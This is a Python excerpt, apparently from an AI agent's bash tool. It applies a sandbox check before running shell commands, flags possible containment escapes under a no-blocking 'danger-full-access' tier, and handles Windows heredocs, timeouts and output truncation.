        # Static file-level isolation check (rant 2026-08-20T15:46:50).
        sandbox_tag: str | None = None
        containment_warning: str | None = None
        if sandbox and sandbox != "danger-full-access":
            allowed, reason, enforcement = _check_sandbox(cmd, sandbox, workdir)
            if not allowed:
                logger.info("bash: BLOCKED by %s sandbox: %s", sandbox, reason)
                return ToolResult(
                    name="bash",
                    content=(
                        f"⛔ [sandbox:{sandbox} enforcement={enforcement}] "
                        f"{reason} — command not executed"
                    ),
                    error=True,
                )
            sandbox_tag = f"[sandbox:{sandbox} enforcement={enforcement}]"
            logger.debug("bash: sandbox %s check passed", sandbox)
        elif sandbox == "danger-full-access":
            # Issue #1102: the danger tier opts into no blocking, but a
            # containment-escape command still gets a visible warning so the
            # caller can spot credential exfiltration in the tool result.
            containment_warning = _check_containment_escape(cmd)

        logger.debug("bash: running %r (timeout=%ds)", cmd[:100], timeout)

        # Windows: cmd.exe cannot parse bash heredocs — translate the first
        # one to a stdin redirect (host sessions 2026-08-14T21:26/21:36 hit
        # "此时不应有 <<" with browser-harness <<'PY'). POSIX unchanged.
        temp_path = None
        if os.name == "nt":
            cmd, temp_path = _translate_windows_heredocs(cmd)

        try:
            proc = await asyncio.create_subprocess_shell(
                cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=workdir,
                # Non-interactive daemon: git/gh children must fail fast
                # silently, never spawn GCM/askpass popups (rant
                # 2026-08-07T10:17:27).
                env=no_prompt_env(),
                preexec_fn=os.setsid if os.name != "nt" else None,
                # Windows: background daemon children must never pop a
                # console window (rant 2026-08-09T13:16:36 — cmd-window
                # storm; bash tool was a top contributor).
                **win32_no_window_kwargs(),
            )
            try:
                stdout, stderr = await asyncio.wait_for(
                    proc.communicate(), timeout=timeout
                )
            except asyncio.TimeoutError:
                # Kill entire process group to prevent orphaned children
                try:
                    if os.name != "nt":
                        os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                    else:
                        proc.kill()
                except (ProcessLookupError, OSError):
                    proc.kill()
                await proc.wait()
                return ToolResult(
                    name="bash",
                    content=f"Command timed out after {timeout}s: {cmd[:100]}",
                    error=True,
                )
            finally:
                if temp_path:
                    try:
                        os.unlink(temp_path)
                    except OSError:
                        pass

            out = _decode_output(stdout).rstrip()
            err = _decode_output(stderr).rstrip()

            # Smart truncation: keep stderr intact (errors are critical),
            # truncate stdout with head+tail when output exceeds limit.
            # This ensures build/test errors at the tail aren't lost.
            ERR_MAX = 30_000  # Always keep stderr up to this
            HEAD_TAIL_RATIO = 0.6  # 60% head, 40% tail
            _SEP = "\n[stderr]\n"  # 10 chars, separator prefix

            if len(err) > ERR_MAX:
                half = ERR_MAX // 2
                err = (
                    f"{err[:half]}\n\n"
                    f"... [stderr truncated: {len(err)} → {ERR_MAX} chars, head+tail kept]"
                    f"\n\n{err[-half:]}"
                )

            # Calculate remaining budget for stdout (accounting for separator)
            err_overhead = len(_SEP) if (out and err) else 0
            remaining = MAX_OUTPUT_CHARS - len(err) - err_overhead
            if remaining < 2000 and err:
                # stderr consumed most budget — truncate stderr further
                remaining = MAX_OUTPUT_CHARS // 2
                err = err[:remaining] + (
                    "\n\n... [stderr truncated to make room for stdout]"
                )

            if out and len(out) > remaining:
                head_chars = int(remaining * HEAD_TAIL_RATIO)
                tail_chars = remaining - head_chars - 200  # message overhead
                if tail_chars < 500:
                    out = out[:remaining - 50] + (
                        f"\n\n... [stdout truncated: {len(out)} → {remaining} chars]"
                    )
                else:
                    out = (
                        f"{out[:head_chars]}\n\n"
                        f"... [{len(out) - remaining} chars omitted] ..."
                        f"\n\n{out[-tail_chars:]}"
                    )

            parts: list[str] = []
            if out:
                parts.append(out)
            if err:
                parts.append(f"[stderr]\n{err}")
            if not parts:
                parts.append("(no output)")
            result = "\n".join(parts)
            if sandbox_tag:
                result = f"{sandbox_tag} ok\n{result}"
            if containment_warning:
                result += (
                    f"\n⚠️ [sandbox:danger-full-access] {containment_warning} "
                    "— executed anyway (danger tier opts into no blocking)"
                )
            return ToolResult(name="bash", content=result)
        except FileNotFoundError:
            return ToolResult(
                name="bash",
                content=f"Command not found: {cmd[:100]}",
                error=True,
            )
        except OSError as e:
            logger.warning("bash error: %s", e)
            return ToolResult(name="bash", content=f"Error: {e}", error=True)
